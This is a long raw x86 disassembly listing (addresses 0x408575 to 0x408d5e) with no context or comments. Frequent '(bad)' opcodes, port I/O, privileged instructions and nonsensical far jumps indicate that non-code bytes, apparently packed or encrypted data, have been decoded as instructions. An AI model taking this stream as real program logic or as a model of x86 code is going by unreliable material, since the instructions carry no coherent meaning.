  408575:	xchg   BYTE PTR [edx+0x48],al
  408578:	mov    edi,0xb420a020
  40857d:	pop    ds
  40857e:	add    eax,0xee03423c
  408583:	push   eax
  408584:	push   0x45
  408586:	cmc    
  408587:	js     0x408541
  408589:	xlat   BYTE PTR ds:[ebx]
  40858a:	int3   
  40858b:	cli    
  40858c:	leave  
  40858d:	pushf  
  40858e:	dec    ebp
  40858f:	jb     0x40853d
  408591:	mov    esi,0x735ca032
  408596:	(bad)  
  408597:	pop    edx
  408598:	in     al,dx
  408599:	(bad)  
  40859a:	cdq    
  40859b:	sub    cl,BYTE PTR [eax]
  40859d:	leave  
  40859e:	mov    cs,ebp
  4085a0:	ret    0xa735
  4085a3:	retf   
  4085a4:	mov    ebp,0xe5b5110
  4085a9:	pop    esi
  4085aa:	test   al,0x23
  4085ac:	xchg   edx,eax
  4085ad:	jno    0x4085d7
  4085af:	add    esp,DWORD PTR [esi-0x20]
  4085b2:	clc    
  4085b3:	iret   
  4085b4:	pop    esp
  4085b5:	arpl   WORD PTR [ebp-0x6ce59521],ax
  4085bb:	sbb    eax,DWORD PTR [edx]
  4085bd:	pusha  
  4085be:	inc    esi
  4085bf:	xchg   BYTE PTR [eax],bh
  4085c1:	mov    ebp,0x62af87b0
  4085c6:	loope  0x408617
  4085c8:	call   0x54a5ad4
  4085cd:	xor    BYTE PTR [ecx+0x72],cl
  4085d0:	inc    ebx
  4085d1:	imul   ecx,DWORD PTR [eax],0x72918c81
  4085d7:	stos   BYTE PTR es:[edi],al
  4085d8:	mov    dl,0x89
  4085da:	or     eax,0x7dbfd752
  4085df:	loopne 0x4085e6
  4085e1:	fnstcw WORD PTR [esi-0x126bcb44]
  4085e7:	mov    esp,0xcd2d88c0
  4085ec:	or     al,0x34
  4085ee:	pop    ebx
  4085ef:	test   eax,0x82ae1320
  4085f4:	or     al,0x57
  4085f6:	push   esi
  4085f7:	mov    eax,ds:0xfe14b006
  4085fc:	in     eax,dx
  4085fd:	fld    TBYTE PTR [ecx+0x1f]
  408600:	in     al,0x95
  408602:	clc    
  408603:	in     al,0x4c
  408605:	sbb    BYTE PTR [edx-0x5f3fc96e],dh
  40860b:	stos   BYTE PTR es:[edi],al
  40860c:	or     al,0x4f
  40860e:	pop    ss
  40860f:	xlat   BYTE PTR ds:[ebx]
  408610:	loope  0x408611
  408612:	mov    ch,0x9d
  408614:	outs   dx,DWORD PTR ds:[esi]
  408615:	push   ds
  408616:	pop    edi
  408617:	sbb    eax,0xd47646b7
  40861c:	(bad)  
  40861d:	adc    eax,0x8ac9b080
  408622:	out    0x9a,eax
  408624:	push   cs
  408625:	aam    0xd3
  408627:	fild   WORD PTR [ecx+0x3f02fa43]
  40862d:	scas   al,BYTE PTR es:[edi]
  40862e:	jnp    0x408636
  408630:	test   eax,0x81496f38
  408635:	sub    eax,0x5a8f0d90
  40863b:	inc    edx
  40863c:	mov    cl,0xd4
  40863e:	inc    esi
  40863f:	xchg   ecx,eax
  408640:	cld    
  408641:	pop    esi
  408642:	pop    ebx
  408643:	push   ecx
  408644:	idiv   DWORD PTR [eax+ecx*4]
  408647:	fsubr  DWORD PTR [edi]
  408649:	sub    BYTE PTR [ecx],dh
  40864b:	and    bl,BYTE PTR [ebx+ebp*1-0x7d]
  40864f:	inc    eax
  408650:	imul   edi,DWORD PTR [edi-0x24d0d0d8],0xfffffffe
  408657:	sahf   
  408658:	lahf   
  408659:	test   BYTE PTR [ecx-0x3d],cl
  40865c:	arpl   WORD PTR [eax+esi*2+0x3e],ax
  408660:	mov    ah,0xaa
  408662:	xor    eax,0x3f501a95
  408667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408668:	aam    0x4f
  40866a:	arpl   si,dx
  40866c:	pop    esp
  40866d:	aam    0x2e
  40866f:	int3   
  408670:	loop   0x4086d7
  408672:	mov    dh,0xde
  408674:	push   ebx
  408675:	push   ds
  408676:	push   ebx
  408677:	jno    0x408628
  408679:	(bad)  
  40867a:	xchg   ebx,eax
  40867b:	ins    DWORD PTR es:[edi],dx
  40867c:	retf   
  40867d:	jmp    0xdfa:0xc22c8d3
  408684:	sub    DWORD PTR [eax+0x0],eax
  408687:	push   esi
  408688:	add    eax,0x9adbb21c
  40868d:	or     DWORD PTR [ebp-0x63ee46ba],ebx
  408693:	stos   DWORD PTR es:[edi],eax
  408694:	xchg   ebx,eax
  408695:	pop    esp
  408696:	mov    al,0x13
  408698:	outs   dx,BYTE PTR ds:[esi]
  408699:	and    dl,cl
  40869b:	mov    DWORD PTR [ebp+ecx*4-0x64],ebp
  40869f:	adc    cl,ch
  4086a1:	fld    st(3)
  4086a3:	pop    eax
  4086a4:	test   eax,0xc3809cb
  4086a9:	push   cs
  4086aa:	les    edx,FWORD PTR [edi+0x12]
  4086ad:	aad    0x94
  4086af:	cmp    eax,0xb4dba419
  4086b4:	jmp    0x4086f4
  4086b6:	sbb    al,0xeb
  4086b8:	dec    ecx
  4086b9:	(bad)  
  4086ba:	or     ebx,DWORD PTR [edx+0x48c24ff6]
  4086c0:	hlt    
  4086c1:	pushf  
  4086c2:	lock add ecx,DWORD PTR [edi+0x3835639a]
  4086c9:	sar    BYTE PTR [esi],cl
  4086cb:	lods   al,BYTE PTR ds:[esi]
  4086cc:	and    BYTE PTR [esi-0x43f23344],cl
  4086d2:	xchg   edi,eax
  4086d3:	arpl   bx,si
  4086d5:	cs pop ecx
  4086d7:	fsubr  QWORD PTR [esi]
  4086d9:	(bad)  
  4086da:	xchg   edi,eax
  4086db:	jmp    0xdc08ac1e
  4086e0:	sub    ecx,ecx
  4086e2:	sbb    cl,BYTE PTR ds:0x50b9a90b
  4086e8:	out    0xb7,al
  4086ea:	mov    ebx,0xa6e53463
  4086ef:	sub    edx,DWORD PTR [ecx+0x5b]
  4086f2:	dec    edi
  4086f3:	loope  0x408693
  4086f5:	adc    BYTE PTR [esi+0x5a18a4b8],bh
  4086fb:	sub    eax,0x5c00d4fb
  408700:	pop    eax
  408701:	sub    eax,0xc55a0990
  408706:	jmp    0x5239a34c
  40870b:	push   cs
  40870c:	xchg   esi,eax
  40870d:	mov    dl,0xab
  40870f:	jns    0x4086a6
  408711:	inc    ebx
  408712:	mov    edx,0xc3e3ee2d
  408717:	aad    0xde
  408719:	clc    
  40871a:	mov    ds:0x88b2540f,eax
  40871f:	jmp    0x4086e5
  408721:	icebp  
  408722:	shl    DWORD PTR [edx],0xbb
  408725:	and    al,0xf5
  408727:	sbb    bl,BYTE PTR [eax+0x6d]
  40872a:	jae    0x40879f
  40872c:	dec    edi
  40872d:	and    eax,0x41670e71
  408732:	dec    ecx
  408733:	xor    edx,DWORD PTR [ebp+0x1f613792]
  408739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873a:	(bad)  
  40873b:	in     eax,dx
  40873c:	in     eax,0x54
  40873e:	adc    eax,0x3c2b6875
  408743:	pop    ss
  408744:	cmp    ch,cl
  408746:	(bad)  
  408747:	pop    esi
  408748:	out    0x3c,al
  40874a:	or     BYTE PTR [edx+0x506a680d],bh
  408750:	jecxz  0x40875b
  408752:	sub    bl,BYTE PTR [eax-0x26]
  408755:	lods   al,BYTE PTR ds:[esi]
  408756:	mov    BYTE PTR [ebx+0x78],ah
  408759:	cwde   
  40875a:	or     al,0x14
  40875c:	sub    eax,0x97085e68
  408761:	fs repz and al,0xd4
  408765:	iret   
  408766:	sub    al,BYTE PTR [esi]
  408768:	stos   DWORD PTR es:[edi],eax
  408769:	add    DWORD PTR [edx-0x1b],ebx
  40876c:	fld    QWORD PTR [edi]
  40876e:	adc    ebx,ebx
  408770:	jg     0x40872f
  408772:	ins    BYTE PTR es:[edi],dx
  408773:	fs cld 
  408775:	mov    dh,0xd9
  408777:	inc    edx
  408778:	mov    ebp,0x47ecb085
  40877d:	xchg   BYTE PTR [esi],cl
  40877f:	leave  
  408780:	xor    bh,BYTE PTR [ebx-0x293b0647]
  408786:	stos   DWORD PTR es:[edi],eax
  408787:	popa   
  408788:	scas   eax,DWORD PTR es:[edi]
  408789:	sub    esi,eax
  40878b:	leave  
  40878c:	jno    0x4087d8
  40878e:	in     eax,dx
  40878f:	dec    eax
  408790:	inc    edi
  408791:	test   BYTE PTR [edi+edx*4-0x45],ch
  408795:	fnstsw WORD PTR [esi+ecx*2]
  408798:	cli    
  408799:	or     BYTE PTR [ecx+0x6fede5cf],ah
  40879f:	mov    al,ds:0xc9feb9d5
  4087a4:	rcr    BYTE PTR [edx-0x4f],1
  4087a7:	inc    esp
  4087a8:	je     0x408798
  4087aa:	gs pop ss
  4087ac:	in     eax,0xb3
  4087ae:	loopne 0x4087cc
  4087b0:	popf   
  4087b1:	jmp    0xe5ee1c9a
  4087b6:	mov    esp,0x8f191c84
  4087bb:	test   DWORD PTR [edi+0x2527b30a],eax
  4087c1:	mov    esi,0x247e0fd8
  4087c6:	xchg   edi,eax
  4087c7:	lods   al,BYTE PTR ds:[esi]
  4087c8:	mov    dh,0x40
  4087ca:	xor    BYTE PTR [edi+0x12a88eac],dh
  4087d0:	jo     0x408771
  4087d2:	(bad)  
  4087d3:	dec    edi
  4087d4:	inc    ecx
  4087d5:	mov    eax,ds:0x52c41d1b
  4087da:	mov    ds:0xa1d313,al
  4087df:	push   esp
  4087e0:	cli    
  4087e1:	xor    BYTE PTR [ebx],cl
  4087e3:	in     eax,dx
  4087e4:	outs   dx,DWORD PTR ds:[esi]
  4087e5:	xchg   esp,eax
  4087e6:	ret    0x3dc8
  4087e9:	cmp    al,0xd7
  4087eb:	lds    eax,FWORD PTR [ebx-0x3e395d7a]
  4087f1:	in     al,dx
  4087f2:	pop    es
  4087f3:	push   esp
  4087f4:	adc    BYTE PTR [ebx+0x6594749d],bh
  4087fa:	aas    
  4087fb:	hlt    
  4087fc:	jne    0x408863
  4087fe:	je     0x408823
  408800:	sbb    esp,0xffffffe8
  408803:	xor    eax,0x6ac90849
  408808:	pop    es
  408809:	mov    edx,0x289e23c2
  40880e:	es or  eax,0xafb8e326
  408814:	inc    eax
  408815:	retf   0xd09b
  408818:	xchg   ebp,eax
  408819:	mov    al,0x98
  40881b:	pop    edx
  40881c:	jnp    0x4087b3
  40881e:	fcomp  QWORD PTR [ecx]
  408820:	ins    DWORD PTR es:[edi],dx
  408821:	pop    ebx
  408822:	xor    edi,DWORD PTR [edi+0x4a]
  408825:	mov    eax,ds:0x8dbced25
  40882a:	sbb    ah,BYTE PTR [esi-0x507986a3]
  408830:	mov    ds,ecx
  408832:	(bad)  
  408833:	add    edi,ebx
  408835:	cwde   
  408836:	mov    al,0x37
  408838:	and    al,bh
  40883a:	cmp    ebx,DWORD PTR [ecx]
  40883c:	dec    esp
  40883d:	inc    ebp
  40883e:	sub    cl,ah
  408840:	sub    bh,BYTE PTR [esi+esi*4]
  408843:	pushf  
  408844:	nop
  408845:	cmp    al,0x5d
  408847:	or     bl,0xae
  40884a:	clc    
  40884b:	or     BYTE PTR [edx],bh
  40884d:	xchg   esp,eax
  40884e:	nop
  40884f:	iret   
  408850:	fidiv  WORD PTR [ecx-0x1101de3e]
  408856:	sub    bh,BYTE PTR [esi]
  408858:	mov    ds:0x56115e62,al
  40885d:	mov    ebx,0xaa388569
  408862:	pop    ecx
  408863:	sub    dh,dl
  408865:	lods   eax,DWORD PTR ds:[esi]
  408866:	shr    BYTE PTR [ebx-0x70a3a058],cl
  40886c:	sbb    BYTE PTR [ebp+0x74],dl
  40886f:	stc    
  408870:	lock in eax,0x7d
  408873:	(bad)  ds:[edx-0x62]
  408877:	xchg   ebp,eax
  408878:	mov    BYTE PTR [eax-0x63],ah
  40887b:	fsubr  DWORD PTR [eiz*1+0x473088ff]
  408882:	mov    ebx,0xcfcc3025
  408887:	test   al,0xad
  408889:	pop    ebx
  40888a:	mov    ebx,0x1f47656f
  40888f:	jo     0x4088ba
  408891:	es cmp edx,esp
  408894:	inc    esp
  408895:	ins    DWORD PTR es:[edi],dx
  408896:	push   ss
  408897:	pusha  
  408898:	xchg   edx,eax
  408899:	inc    ebp
  40889a:	mov    edx,0x53e89d7e
  40889f:	or     ebp,esi
  4088a1:	fistp  WORD PTR [ecx-0x5c]
  4088a4:	fild   WORD PTR [eax+0x9]
  4088a7:	mov    BYTE PTR [ecx+0x446e5d60],bl
  4088ad:	imul   eax,ebp,0xffffffec
  4088b0:	out    dx,eax
  4088b1:	and    al,0x4b
  4088b3:	pop    ebx
  4088b4:	mov    ch,0x50
  4088b6:	pop    ebx
  4088b7:	sbb    DWORD PTR [edi-0x24],ebx
  4088ba:	push   es
  4088bb:	scas   eax,DWORD PTR es:[edi]
  4088bc:	repz adc esp,DWORD PTR [esi]
  4088bf:	in     al,0xfd
  4088c1:	imul   edi,DWORD PTR [esi-0x55],0xab02510a
  4088c8:	cdq    
  4088c9:	inc    ebp
  4088ca:	xchg   esi,eax
  4088cb:	in     eax,0x55
  4088cd:	test   eax,0x2e34c954
  4088d2:	inc    edi
  4088d3:	pop    ds
  4088d4:	push   ebx
  4088d6:	enter  0xcfc8,0x93
  4088da:	test   DWORD PTR [edi+0x1a8650f1],ebp
  4088e0:	or     dh,BYTE PTR [esi]
  4088e2:	jbe    0x4088dc
  4088e4:	add    ebx,edx
  4088e6:	pop    ebp
  4088e7:	retf   
  4088e8:	std    
  4088e9:	jo     0x4088d7
  4088eb:	shl    ebx,0xb2
  4088ee:	xchg   ebp,eax
  4088ef:	sub    al,cl
  4088f1:	jnp    0x40894b
  4088f3:	xor    cl,0x39
  4088f6:	mov    ecx,0x491d854b
  4088fb:	imul   ecx,DWORD PTR [ecx],0xffffffd7
  4088fe:	pop    edi
  4088ff:	fidiv  WORD PTR [ebx+0x1b857ca7]
  408905:	add    edx,esp
  408907:	cmp    ebx,ecx
  408909:	sahf   
  40890a:	cld    
  40890b:	cmp    dl,BYTE PTR [edi+0x7429fdb4]
  408911:	retf   
  408912:	les    ebx,FWORD PTR [ebp+0x23]
  408915:	jmp    0xef8b:0x498882cc
  40891c:	in     al,0x65
  40891e:	jle    0x408947
  408920:	mov    esp,0x8d3567aa
  408925:	add    BYTE PTR [edi-0x1a07354],bh
  40892b:	dec    esi
  40892c:	or     DWORD PTR [ecx-0x22],ecx
  40892f:	mov    bh,0x6c
  408931:	dec    edx
  408932:	mov    bl,0x7f
  408934:	int    0xd8
  408936:	aas    
  408937:	xor    eax,0x8341c5c9
  40893c:	xor    al,0x57
  40893e:	mov    edx,0x959d9198
  408943:	inc    edx
  408944:	hlt    
  408945:	ror    esp,cl
  408947:	fidivr WORD PTR [eax]
  408949:	xlat   BYTE PTR ds:[ebx]
  40894a:	adc    eax,0x79cec79a
  40894f:	add    al,0x28
  408951:	into   
  408952:	retf   
  408953:	xor    al,0x1d
  408955:	cmp    al,al
  408957:	cwde   
  408958:	or     edi,DWORD PTR [ebx+ecx*4+0x385be59c]
  40895f:	add    DWORD PTR [ecx],ebp
  408961:	sbb    eax,0x79eb0f16
  408966:	jns    0x408915
  408968:	and    eax,0x56d35f1c
  40896d:	rcr    DWORD PTR [esi-0x4b],1
  408970:	and    BYTE PTR [ebx-0x71],ch
  408973:	call   FWORD PTR ds:[eax+esi*1-0x63]
  408978:	ins    DWORD PTR es:[edi],dx
  408979:	shl    DWORD PTR [eax+0x6cee9256],cl
  40897f:	or     ch,BYTE PTR [esp+esi*8+0x41]
  408983:	or     ebp,ebx
  408985:	leave  
  408986:	lds    edi,FWORD PTR [edi+0x5a]
  408989:	add    BYTE PTR ds:0x6ed95a40,ch
  40898f:	inc    eax
  408990:	jle    0x408982
  408992:	fwait
  408993:	push   ebp
  408994:	imul   edi,DWORD PTR [ebx],0xa91b6f86
  40899a:	cld    
  40899b:	inc    edi
  40899c:	jl     0x4089fc
  40899e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40899f:	sub    bl,BYTE PTR [esp+eax*1]
  4089a2:	cmp    eax,0x5accb803
  4089a7:	jo     0x408a11
  4089a9:	mov    eax,0xf819db41
  4089af:	inc    ebp
  4089b0:	mov    ebp,0xf2495cfd
  4089b5:	xor    eax,0x7e08cd34
  4089ba:	gs icebp 
  4089bc:	pushf  
  4089bd:	push   0x14
  4089bf:	mov    ecx,es
  4089c1:	xchg   edi,eax
  4089c2:	les    esp,FWORD PTR ss:[edx]
  4089c5:	pop    ecx
  4089c6:	push   ss
  4089c7:	loop   0x4089ca
  4089c9:	pop    eax
  4089ca:	pusha  
  4089cb:	jmp    0x54852e12
  4089d0:	inc    esi
  4089d1:	mov    dl,0xd7
  4089d3:	shr    DWORD PTR [esi+0x4a127dbf],cl
  4089d9:	sub    ebp,DWORD PTR [eax-0x6ff69de]
  4089df:	jo     0x408a29
  4089e1:	inc    ecx
  4089e2:	daa    
  4089e3:	dec    esi
  4089e4:	jae    0x4089fa
  4089e6:	adc    eax,0x7e46b7b2
  4089eb:	test   DWORD PTR [ecx+edx*2-0x30],eax
  4089ef:	pop    ebp
  4089f0:	(bad)  
  4089f1:	(bad)  
  4089f2:	(bad)  
  4089f3:	loop   0x408a4b
  4089f5:	iret   
  4089f6:	or     DWORD PTR [esi+0x11],esi
  4089f9:	xor    DWORD PTR ds:0x110208d,eax
  4089ff:	cmp    BYTE PTR [eax+ecx*1+0x46],cl
  408a03:	jle    0x408a3c
  408a05:	cs add edx,ebx
  408a08:	sbb    al,0x15
  408a0a:	fcomp  QWORD PTR [eax-0x71]
  408a0d:	xlat   BYTE PTR ds:[ebx]
  408a0e:	mov    edx,0x94d662
  408a13:	or     edi,DWORD PTR [eax-0x5e]
  408a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a17:	in     al,dx
  408a18:	fcomp  DWORD PTR [edx+0x7d]
  408a1b:	lea    esi,[eax+0x66]
  408a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a1f:	xchg   edi,eax
  408a20:	jg     0x4089e0
  408a22:	loopne 0x4089b5
  408a24:	test   al,0x5d
  408a26:	(bad)  [eax+eax*8-0x2d]
  408a2a:	cdq    
  408a2b:	cld    
  408a2c:	out    dx,eax
  408a2d:	mov    cl,BYTE PTR [edx+0x7b8b4054]
  408a33:	mov    al,ds:0xb6210c76
  408a38:	adc    dh,BYTE PTR [edx-0x67]
  408a3b:	or     eax,0x5f764e6b
  408a40:	jl     0x408a43
  408a42:	and    DWORD PTR [ecx+edx*2-0x5aee4f31],ecx
  408a49:	(bad)  
  408a4a:	dec    esi
  408a4b:	or     DWORD PTR [eax+ebx*1+0x3da25afa],eax
  408a52:	adc    al,0x7a
  408a54:	add    DWORD PTR [esi+0x41053e68],esi
  408a5a:	call   0x81e54855
  408a5f:	dec    edx
  408a60:	ss scas al,BYTE PTR es:[edi]
  408a62:	jle    0x408ae3
  408a64:	push   ds
  408a65:	and    esp,DWORD PTR [esi]
  408a67:	in     al,0xe9
  408a69:	sbb    al,0xe5
  408a6b:	or     eax,eax
  408a6d:	imul   eax,DWORD PTR [edi+0x18c5f5c7],0xffffffd2
  408a74:	(bad)  
  408a75:	xchg   ebp,eax
  408a76:	test   eax,0xe7fadc23
  408a7b:	es ins DWORD PTR es:[edi],dx
  408a7d:	bound  eax,QWORD PTR [edx-0x6a10321]
  408a83:	cmc    
  408a84:	repnz xchg esi,eax
  408a86:	jge    0x408a18
  408a88:	sub    DWORD PTR ds:0x704202e8,ecx
  408a8e:	add    bl,BYTE PTR [esp+ebx*4+0x5e300786]
  408a95:	call   0x22afa929
  408a9a:	popf   
  408a9b:	cld    
  408a9c:	fistp  WORD PTR [edx+ebp*4-0x2ffeb826]
  408aa3:	stos   DWORD PTR es:[edi],eax
  408aa4:	loopne 0x408a95
  408aa6:	mov    ss,WORD PTR [ebx]
  408aa8:	jg     0x408ae2
  408aaa:	mov    cl,0x4e
  408aac:	or     BYTE PTR [ecx+0x6ca26093],dh
  408ab2:	jge    0x408a75
  408ab4:	jmp    0x408afe
  408ab6:	cmp    DWORD PTR [eax],esi
  408ab8:	dec    edi
  408ab9:	sbb    al,0xb6
  408abb:	mov    ds:0xe1aae9d6,al
  408ac0:	mov    ds:0xc3d4e4fc,eax
  408ac5:	je     0x408aa7
  408ac7:	push   ecx
  408ac8:	es and al,0x73
  408acb:	sbb    al,0x79
  408acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ace:	xor    BYTE PTR [ebx],al
  408ad0:	int    0x6a
  408ad2:	cmp    bl,BYTE PTR [esp+ebp*8-0x7fae5de1]
  408ad9:	cs es js 0x408b13
  408add:	xor    eax,0xedc53467
  408ae2:	sub    DWORD PTR [ecx],eax
  408ae4:	mov    eax,ds:0x769d4d
  408ae9:	pop    edx
  408aea:	loopne 0x408b4a
  408aec:	xor    esp,DWORD PTR [ecx-0x1f]
  408aef:	sysenter 
  408af1:	xchg   ebx,eax
  408af2:	call   0xd3f8:0xb60d7e
  408af9:	addr16 test eax,0x6f2b232a
  408aff:	jae    0x408b35
  408b01:	call   0x1f7:0x5c6a779f
  408b08:	sub    eax,0xda1fdc52
  408b0d:	jno    0x408ace
  408b0f:	imul   ecx,DWORD PTR [esi],0xe2b51322
  408b15:	sub    al,0x80
  408b17:	fisubr WORD PTR [edi]
  408b19:	cmp    eax,0xc47fd29b
  408b1e:	mov    dh,0x7e
  408b20:	div    ah
  408b22:	xchg   ebx,eax
  408b23:	aaa    
  408b24:	fwait
  408b25:	mov    cl,0x2b
  408b27:	mov    al,0xb6
  408b29:	imul   ecx,DWORD PTR [eax],0xffffff8c
  408b2c:	add    ah,BYTE PTR es:[ebp-0x48]
  408b30:	adc    al,0xd0
  408b32:	adc    eax,0xe7f70106
  408b37:	jecxz  0x408b20
  408b39:	mov    dl,0xbd
  408b3b:	or     DWORD PTR [ecx+ebp*1],esp
  408b3e:	jecxz  0x408bb4
  408b40:	out    dx,al
  408b41:	jne    0x408b7b
  408b43:	mov    ecx,0x94071213
  408b48:	test   BYTE PTR [edi],dl
  408b4a:	fidiv  WORD PTR [edx+0x2afd203c]
  408b50:	mov    DWORD PTR [esi+edx*8-0x77],edi
  408b54:	xor    ch,bh
  408b56:	and    al,BYTE PTR [ecx+0x4ef15b6c]
  408b5c:	loope  0x408af6
  408b5e:	pop    ecx
  408b5f:	inc    esi
  408b60:	nop
  408b61:	out    dx,al
  408b62:	jns    0x408ba3
  408b64:	cmp    bl,al
  408b66:	enter  0xeef0,0xa9
  408b6a:	xor    DWORD PTR [edi],edi
  408b6c:	imul   eax,DWORD PTR [edi+0x6b],0x35
  408b70:	jecxz  0x408b02
  408b72:	jg     0x408b7c
  408b74:	xchg   ecx,eax
  408b75:	test   ebx,esi
  408b77:	xor    DWORD PTR [eax+0x0],0xc
  408b7b:	and    BYTE PTR [edi],ah
  408b7d:	jle    0x408b37
  408b7f:	in     eax,dx
  408b80:	ss jns 0x408b33
  408b83:	pop    ebp
  408b84:	mov    ebx,esi
  408b86:	sbb    DWORD PTR ds:0x25ba6c8c,edx
  408b8c:	cli    
  408b8d:	ins    DWORD PTR es:[edi],dx
  408b8e:	cmp    DWORD PTR [eax+edi*2+0x68f32de3],edx
  408b95:	addr16 dec ebp
  408b97:	test   BYTE PTR [edx+ecx*2+0x6bbef976],al
  408b9e:	mov    al,0x1
  408ba0:	retf   0x594e
  408ba3:	(bad)  [edx]
  408ba5:	mov    edi,0x7446120d
  408baa:	(bad)  
  408bab:	retf   0x71b0
  408bae:	retf   
  408baf:	add    ecx,DWORD PTR [ecx+0x3a06eac1]
  408bb5:	pop    ds
  408bb6:	add    edi,DWORD PTR [esi+0x24]
  408bb9:	mov    ds:0x61f19b23,al
  408bbe:	shr    BYTE PTR [edx+edi*4+0x28],1
  408bc2:	retf   0xbd07
  408bc5:	fwait
  408bc6:	pop    es
  408bc7:	enter  0x40dc,0xd2
  408bcb:	scas   eax,DWORD PTR es:[edi]
  408bcc:	mov    eax,0xfa9ab47c
  408bd1:	pop    ss
  408bd2:	out    0x6,eax
  408bd4:	push   0xda4580b6
  408bd9:	push   ss
  408bda:	push   0xfffffff6
  408bdc:	jne    0x408bcc
  408bde:	inc    ebp
  408bdf:	push   ds
  408be0:	out    dx,eax
  408be1:	pop    esp
  408be2:	jmp    0xc60a:0xaf3424ac
  408be9:	inc    esp
  408bea:	sbb    ch,BYTE PTR [ebx]
  408bec:	pop    ecx
  408bed:	xchg   ecx,eax
  408bee:	and    al,0xd4
  408bf0:	data16 jno 0x408c67
  408bf3:	js     0x408b9b
  408bf5:	xchg   ebp,eax
  408bf6:	repz (bad) 
  408bf8:	pop    ebp
  408bf9:	addr16 jbe 0x408b9c
  408bfc:	shl    BYTE PTR [edi],1
  408bfe:	xor    al,0xc7
  408c00:	outs   dx,BYTE PTR ds:[esi]
  408c01:	stos   BYTE PTR es:[edi],al
  408c02:	daa    
  408c03:	int    0x8d
  408c05:	inc    edi
  408c06:	push   cs
  408c07:	jns    0x408b9f
  408c09:	jmp    0x408c54
  408c0b:	jo     0x408c26
  408c0d:	add    DWORD PTR [ebx+0x6d6a489b],0x69
  408c14:	in     eax,0xe4
  408c16:	sbb    BYTE PTR [edx],0xf5
  408c19:	add    BYTE PTR [ebx],0x9f
  408c1c:	jno    0x408c6d
  408c1e:	mov    al,ds:0x30bd221d
  408c23:	sub    ebp,DWORD PTR [eax+0x3cf6adba]
  408c29:	mov    esp,DWORD PTR [edx+0x401fb3fe]
  408c2f:	call   0x88b8:0x225b8f57
  408c36:	not    dl
  408c38:	rcr    BYTE PTR [esi],cl
  408c3a:	inc    esi
  408c3b:	pop    ebp
  408c3c:	arpl   WORD PTR [esi],bx
  408c3e:	cmp    ecx,DWORD PTR [ecx+0x70]
  408c41:	das    
  408c42:	jg     0x408bd3
  408c44:	dec    ecx
  408c45:	jmp    0x408c67
  408c47:	fwait
  408c48:	mov    DWORD PTR [esi+0x55e90398],ebx
  408c4e:	sub    bh,BYTE PTR ss:[edx-0x22993a3b]
  408c55:	mov    al,0x4a
  408c57:	jbe    0x408c1f
  408c59:	fwait
  408c5a:	loop   0x408c40
  408c5c:	push   ebp
  408c5d:	bound  ecx,QWORD PTR [esi+0x4e1dbc8e]
  408c63:	and    BYTE PTR [esi],dh
  408c65:	sbb    esp,DWORD PTR [ecx]
  408c67:	pop    esi
  408c68:	test   eax,0xe89a86d
  408c6d:	out    dx,eax
  408c6e:	scas   eax,DWORD PTR es:[edi]
  408c6f:	bnd js 0x408c91
  408c72:	mov    ecx,0x675ffb36
  408c77:	push   ds
  408c78:	call   0xe2e0:0xd8df72df
  408c7f:	cwde   
  408c80:	das    
  408c81:	mov    ebp,0xd88e2c57
  408c86:	lock push 0xf4458d3
  408c8c:	jb     0x408c85
  408c8e:	and    al,0x60
  408c90:	cmp    al,0xf3
  408c92:	cs pushf 
  408c94:	add    ah,bh
  408c96:	cmp    eax,0x8d067439
  408c9b:	popa   
  408c9c:	xor    al,0x46
  408c9e:	sbb    al,0xe7
  408ca0:	stos   BYTE PTR es:[edi],al
  408ca1:	add    bl,BYTE PTR [edx]
  408ca3:	test   eax,0x167f58ca
  408ca8:	inc    ebp
  408ca9:	mov    cl,0x80
  408cab:	add    eax,0xb0dd696c
  408cb0:	jb     0x408c7d
  408cb2:	dec    esp
  408cb3:	xlat   BYTE PTR ds:[bx]
  408cb5:	add    DWORD PTR [edx+0x2f93c092],ebp
  408cbb:	leave  
  408cbc:	xchg   ebp,eax
  408cbd:	add    BYTE PTR [edx-0x4efc0033],dl
  408cc3:	daa    
  408cc4:	adc    BYTE PTR [ecx],0x77
  408cc7:	mov    ds:0xb26e3ace,eax
  408ccc:	mov    edi,0xcf50564f
  408cd1:	stos   DWORD PTR es:[edi],eax
  408cd2:	add    DWORD PTR [ebx],0x650734e2
  408cd8:	jge    0x408d3e
  408cda:	clc    
  408cdb:	hlt    
  408cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cdd:	jge    0x408cc9
  408cdf:	dec    esi
  408ce0:	and    ch,dh
  408ce2:	jl     0x408c9c
  408ce4:	add    DWORD PTR [edi],eax
  408ce6:	mov    edx,edx
  408ce8:	popa   
  408ce9:	aad    0xc5
  408ceb:	dec    ebx
  408cec:	jne    0x408d54
  408cee:	mov    al,ds:0xbd3890d8
  408cf3:	test   al,cl
  408cf5:	ins    BYTE PTR es:[edi],dx
  408cf6:	dec    ebp
  408cf7:	int3   
  408cf8:	fwait
  408cf9:	mov    bh,0x48
  408cfb:	jge    0x408d5f
  408cfd:	imul   edi,edx,0x3ad08ef4
  408d03:	in     eax,0xf4
  408d05:	jl     0x408d3f
  408d07:	adc    BYTE PTR [edx-0x524dd49e],cl
  408d0d:	scas   al,BYTE PTR es:[edi]
  408d0e:	cmp    BYTE PTR [ebx],bl
  408d10:	ja     0x408d48
  408d12:	retf   0xdb4e
  408d15:	les    eax,FWORD PTR [esi+0x3196ab4c]
  408d1b:	push   edx
  408d1c:	into   
  408d1d:	repz retf 0xacd0
  408d21:	jle    0x408ca5
  408d23:	(bad)  
  408d24:	push   0xffffff82
  408d26:	mov    dh,0x62
  408d28:	sub    eax,0x7fb25697
  408d2d:	or     eax,0x8acfc776
  408d32:	cdq    
  408d33:	mov    ebp,0x6b7024c2
  408d38:	cmp    edx,DWORD PTR [edi]
  408d3a:	dec    esp
  408d3b:	mov    esi,0x320a0054
  408d40:	xchg   DWORD PTR [edx],ebp
  408d42:	adc    eax,0xe41627d3
  408d47:	jl     0x408d27
  408d49:	pop    ebx
  408d4a:	xchg   ecx,eax
  408d4b:	mov    dh,0xf9
  408d4d:	mov    dl,0x35
  408d4f:	add    al,0x1b
  408d51:	mov    ah,0x15
  408d53:	icebp  
  408d54:	jmp    0xc874:0x53a44c7a
  408d5b:	inc    esi
  408d5c:	ss dec esi
  408d5e:	jbe    0x408d49
